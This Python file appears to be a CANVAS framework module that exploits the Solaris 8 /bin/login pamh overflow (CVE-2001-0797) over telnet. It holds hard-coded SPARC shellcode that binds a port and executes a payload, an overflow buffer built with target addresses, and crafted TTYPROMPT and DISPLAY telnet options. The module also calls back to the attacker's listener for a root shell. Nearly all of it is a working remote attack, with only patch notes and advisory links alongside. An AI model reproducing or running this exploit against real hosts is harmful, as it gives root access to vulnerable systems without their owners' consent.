#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""

Sparc Solaris <= 8 /bin/login pamh exploit for CANVAS

"""

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

#author: sinan.eren@immunityinc.com

notes="""
These may be fixes for this vulnerablity, however they apply to telnetd
and this vulnerability has to be in login.

Solaris 8: 110668-03
Solaris 8x86: 110669-03

Solaris 7: 107475-04
Solaris 7x86: 107476-04

Solaris 2.6: 106049-04
Solaris 2.6x86: 106050-04

Solaris 2.5.1: 103640-40
Solaris 2.5.1x86: 103641-40

solaris 8 login fix: 111085-02
solaris 7 login fix: 112300-01
solaris 2.6 login fix: 105665-04
solaris 2.5.1 login fix: 106160-02

"""
import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append("exploits/remote/unix/sunlogin")

import socket
import select
import time
import struct

from exploitutils import *
from libs import ctelnetlib
import random

from sunlogin import theexploit as fflagexploit

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["WARNING"]="Exploit might require 2 tries for success since initial conditions might fail."
DOCUMENTATION["Date public"]="12/12/2001"
DOCUMENTATION["CERT Advisory"]="http://www.cert.org/advisories/CA-2001-34.html"
DOCUMENTATION["CVE Name"] = "CVE-2001-0797"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0797"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F41987&zone_32=category%3Asecurity"
DOCUMENTATION["Patch Information"]="Solaris 2.5.1 patch 106160-02, Solaris 2.6 patch 105665-04, Solaris 7 patch 112300-01, Solaris 8 patch 111085-02"
DOCUMENTATION["Development Notes"]="This exploit will get you root (uid=0) unlike the other sunlogin exploit.\n"+\
                                   "Run this exploit first and if not succesfull than try the other."

DESCRIPTION="Solaris Login pamh Overflow"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Solaris", "sparc", "_i86pc"] ]

NAME="Sun Login pamh Overflow"

DEBUGNOTES="""
it uses bindrecvexec shellcode but it execs standard canvas shellcode
there is no direct inet socket
it is a pty so you can not dup and exec
"""

#read this for some interesting reasons why you can't derive both from tcpexploit
#and from fflagexploit in 2.3
#http://mail.python.org/pipermail/python-bugs-list/2003-April/017019.html
class theexploit(fflagexploit):
    def __init__(self):
        fflagexploit.__init__(self)
        self.setPort(23)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x01\x02\x03\x04\x00\x20\\/.:?\r\n%?"
        random.seed()
        self.bindport = random.randint(3333, 3999)
        print "random bind port is: %d" % self.bindport

        #Important stuff goes here!!! FIXME: add addies for 7 and 6
        # rel: [fptraddr, scaddr]
        self.modul = { 8: [0x27038, 0x28424], 7: [0,0], 6: [0,0] }

        self.mynop = "\x98\x1f\xc0\x1f"
        #recvexec.s shellcode
        self.myshellcode =\
            "\x86\x22\xfe\x70"+\
            "\x98\x1f\xc0\x1f"+\
            "\x82\x23\x3f\xd7"+\
            "\x82\x20\x60\x28"+\
            "\x84\x23\x37\xd8"+\
            "\x84\x20\xa0\x28"+\
            "\x90\x10\x80\x01"+\
            "\x82\x23\x3f\xd0"+\
            "\x91\xd0\x20\x08"+\
            "\x82\x23\x3f\xc0"+\
            "\x82\x20\x60\x28"+\
            "\x84\x23\x37\xd8"+\
            "\x84\x20\xa0\x28"+\
            "\x90\x10\x80\x01"+\
            "\x82\x23\x3f\xd0"+\
            "\x91\xd0\x20\x08"+\
            "\x90\x23\x3f\xfe"+\
            "\x92\x23\x3f\xfe"+\
            "\x94\x22\x60\x02"+\
            "\x96\x22\x60\x02"+\
            "\x82\x23\x3e\x70"+\
            "\x82\x20\x60\xaa"+\
            "\x98\x23\x3f\xff"+\
            "\x91\xd0\x20\x08"+\
            "\x84\x22\x3f\xfe"+\
            "\x98\x1f\xc0\x1f"+\
            "\xa0\x23\x3f\xfe"+\
            "\xa1\x2c\x20\x10"+\
            "\x90\x14"+struct.pack(">h", (self.bindport | 0x2000))+\
            "\x92\x1f\xc0\x1f"+\
            "\xd0\x3b\xbf\xe0"+\
            "\x92\x23\xa0\x20"+\
            "\x90\x20\xa0\x02"+\
            "\x94\x23\x3f\xf0"+\
            "\x82\x23\x3e\x70"+\
            "\x82\x20\x60\xa8"+\
            "\x91\xd0\x20\x08"+\
            "\x98\x1f\xc0\x1f"+\
            "\x90\x20\xa0\x02"+\
            "\x92\x23\x3f\xfb"+\
            "\x82\x23\x3e\x70"+\
            "\x82\x20\x60\xa7"+\
            "\x91\xd0\x20\x08"+\
            "\x98\x1f\xc0\x1f"+\
            "\x90\x20\xa0\x02"+\
            "\x92\x1f\xc0\x1f"+\
            "\x94\x1f\xc0\x1f"+\
            "\x82\x23\x3e\x70"+\
            "\x82\x20\x60\xa6"+\
            "\x91\xd0\x20\x08"+\
            "\x98\x1f\xc0\x1f"+\
            "\x92\x20\xff\xf8"+\
            "\x94\x23\x3c\xe0"+\
            "\x82\x23\x3e\x70"+\
            "\x82\x20\x60\xa3"+\
            "\x96\x1f\xc0\x1f"+\
            "\x91\xd0\x20\x08"+\
            "\x81\xd8\xe0\x08"+\
            "\x81\xc0\xe0\x08"+\
            "\x98\x1f\xc0\x1f"
        return

    def createShellcode(self):
        localhost = self.callback.ip
        localport = self.callback.port
        print "Calling back to %s:%s" % (localhost, localport)
        return self.createSparcShellcode(self.badstring, localhost, localport)

    def neededListenerTypes(self):
        from canvasengine import SOLARISSPARCMOSDEF
        return [SOLARISSPARCMOSDEF]

    def makesploit(self):
        self.expbuf = ""
        self.expbuf += "root AA"

        print "myshellcode len: %d" % len(self.myshellcode)
        #many release specific alignment issues
        if self.rel == 8:
            self.expbuf += "A"
        #diag
        #print self.myshellcode.count("\\")   #0
        #print self.myshellcode.count("\x04") #
        #print self.myshellcode.count("\r") #0
        #print self.myshellcode.count("\n") #0
        #print self.myshellcode.count(" ") #
        #print self.myshellcode.count("\t") #
        #print self.myshellcode.count("\xff") #
        #print self.myshellcode.count("\x03")

        if self.myshellcode.count("\xff"):
            #print "escapeing 0xff"
            self.myshellcode = self.myshellcode.replace("\xff", "\xff\xff")

        self.expbuf += "123" #padding for shellcode to align in inputline

        self.expbuf += self.mynop*2
        self.expbuf += self.myshellcode
        self.expbuf += "\x04"

        self.expbuf += "DDD"   #padding for %i0 + 0x210 to align

        self.expbuf += "AAA "*45
        self.expbuf += "\x04\x20"
        self.expbuf += "AAA "*45
        self.expbuf += "\x04\x20"
        self.expbuf += struct.pack(">L", self.scaddr)*45
        self.expbuf += "\x04\x20"
        self.expbuf += "AAA"
        self.expbuf += struct.pack(">L", self.fptraddr)*45
        self.expbuf += "\x04\x20"
        self.expbuf += "123"
        self.expbuf += struct.pack(">L", self.fptraddr)*45
        self.expbuf += "\x04\x20"

        #plus IAC,WONT,TELOPT_BINARY
        self.expbuf += ctelnetlib.IAC
        self.expbuf += ctelnetlib.WONT
        self.expbuf += ctelnetlib.BINARY

        self.expbuf += "\x04\x04"

    def sendoptionsandrecv(self, buf):
        try:
            self.s.send(buf)

            rd, wr, ex = select.select([self.s], [], [], 8)
            if not rd:
                print "timeout in recv!"
                return 0
            else:
                self.s.recv(4000)
                return 1
        except socket.error:
            pass

    def negotiate(self):

        self.log("Stage 1- Initiating telnet negotiation")

        self.buf = ""
        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.DO
        self.buf += ctelnetlib.SGA

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.WILL
        self.buf += ctelnetlib.TTYPE

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.WILL
        self.buf += ctelnetlib.NAWS

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.WILL
        self.buf += ctelnetlib.TSPEED

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.WILL
        self.buf += ctelnetlib.LFLOW

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.WILL
        self.buf += ctelnetlib.LINEMODE

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.WILL
        self.buf += ctelnetlib.NEW_ENVIRON

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.DO
        self.buf += ctelnetlib.STATUS

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.WILL
        self.buf += ctelnetlib.XDISPLOC

        self.sendoptionsandrecv(self.buf)

        self.buf = ""
        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.SB
        self.buf += ctelnetlib.NAWS
        self.buf += "\x00\x50\x00"
        self.buf += ctelnetlib.TTYPE

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.SE

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.WONT
        self.buf += ctelnetlib.OLD_ENVIRON

        self.sendoptionsandrecv(self.buf)

        self.log("Stage 2- Sending the environment variables")

        self.buf = ""
        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.SB
        self.buf += ctelnetlib.TTYPE
        self.buf += "\x00"
        self.buf += "dtterm1"

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.SE
        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.SB
        self.buf += ctelnetlib.XDISPLOC
        self.buf += "\x00"
        self.buf += "localhost:0.0"
        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.SE

        #self.sendoptionsandrecv(self.buf)


        TELQUAL_IS = "\x00"
        NEW_ENV_VAR = "\x00"
        VALUE = "\x01"
        USERVAR = "\x03"

        #self.buf = ""

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.SB
        self.buf += ctelnetlib.NEW_ENVIRON
        self.buf += TELQUAL_IS
        self.buf += NEW_ENV_VAR

        self.buf += "DISPLAY"
        self.buf += VALUE
        self.buf += "evilhost:0.0"

        self.buf += USERVAR
        self.buf += "TTYPROMPT"
        self.buf += VALUE
        self.buf += "canvas"
        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.SE

        self.sendoptionsandrecv(self.buf)

        self.buf = ""
        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.DO
        self.buf += ctelnetlib.ECHO

        self.buf += ctelnetlib.IAC
        self.buf += ctelnetlib.WONT
        self.buf += ctelnetlib.ECHO

        self.sendoptionsandrecv(self.buf)

        return 1

    def attack(self):
        self.log("Stage 3- Sending the overflow vector and the shellcode")

        self.makesploit()
        self.s.send(self.expbuf)
        time.sleep(5)

        rd, wr, ex = select.select([self.s], [], [], 8)
        if not rd:
            pass
        else:
            self.s.recv(4000)

        s = self.gettcpsock()
        try:
            s.connect((self.host, self.bindport))
        except:
            return 0

        try:
            s.send(self.shellcode)
            s.close()
        except:
            pass

        return 1

    def test(self):
        return fflagexploit.test(self)

    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        #first make socket connection to target
        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
        self.log("Connecting to %s:%d"%(self.host,self.port))
        self.s = self.gettcpsock()
        try:
            self.s.connect((self.host, int(self.port)))
        except:
            self.log("Could not connect!")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0

        #modulerize
        if self.version == 0:
            bannergrab = self.engine.getModuleExploit("telnetbanner")
            bannergrab.link(self)
            bannergrab.port = 23
            self.rel = bannergrab.get_os()

            if self.rel not in range(6,9):
                self.log("Unable to autodetect remote Solaris version. Please manually specify.")
                return 0
            self.log("Autodetection is succesful. Remote Solaris revision is: %d" % self.rel)
        elif self.version == 1:
            self.rel = 8
        elif self.version == 2:
            self.rel = 7
        else:
            self.rel = 6

        if self.rel != 8:
            self.log("\nCurrently only supporting Solaris 8 sun4u.\nNext release will include Solaris 7 and 2.6\n")
            return 0

        #grab function pointer and shellcode addie
        self.fptraddr, self.scaddr = self.modul[self.rel]

        #self.scaddr = 0x28424
        #self.fptraddr = 0x27038

        try:
            self.negotiate()
        except:
            self.log("Telnet negotiation failed. Bailing out.")
            import traceback
            print '-'*60
            traceback.print_exc(file=sys.stdout)
            print '-'*60
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0

        #raw_input("attach!")

        time.sleep(2)
        try:
            if not self.attack():
                self.log("Exploitation failed.Target is patched or the bind-shellcodes port is filtered.")
                return 0
        except:
            self.log("Exploitation failed.")
            import traceback
            print '-'*60
            traceback.print_exc(file=sys.stdout)
            print '-'*60
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0

        try:
            self.s.close()
        except:
            pass

        self.log("Stage 4 - Polling for shellcode connection")

        time.sleep(4)

        if self.ISucceeded():
            self.log("Success!!")
            self.setInfo("%s attacking %s:%d - done (succeeded!)"%(NAME,self.host,self.port))
            return 1

        self.log("Exploitation appears not to have been successful.")
        self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
        return 0

    def displayVersions(self):
        print "0 : Autodetect "
        print "1 : Solaris 8 Ultra "
        print "2 : Solaris 7 Ultra "
        print "3 : Solaris 2.6 Ultra "
        return

    # needs a custom usage because it imports sunlogin and will otherwise
    def usage(self):
        import sys
        print "="*20 + "main options" + "="*22
        print "Standard options: -v <version> -t <host> [ -p <port> ]"
        print "Callback options: -l <localhost> -d <localport>"
        print "="*20 + "additional options" +"="*16
        print "Toggle test mode: -T"
        print "Set covertness: -C <covertness>"
        print "="*20 + "custom options"+ "="*20
        try:
            for option in app.options:
                print option
        except:
            pass
        print "="*20 + "versions" + "="*26
        try:
            self.displayVersions()
        except AttributeError:
            pass

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
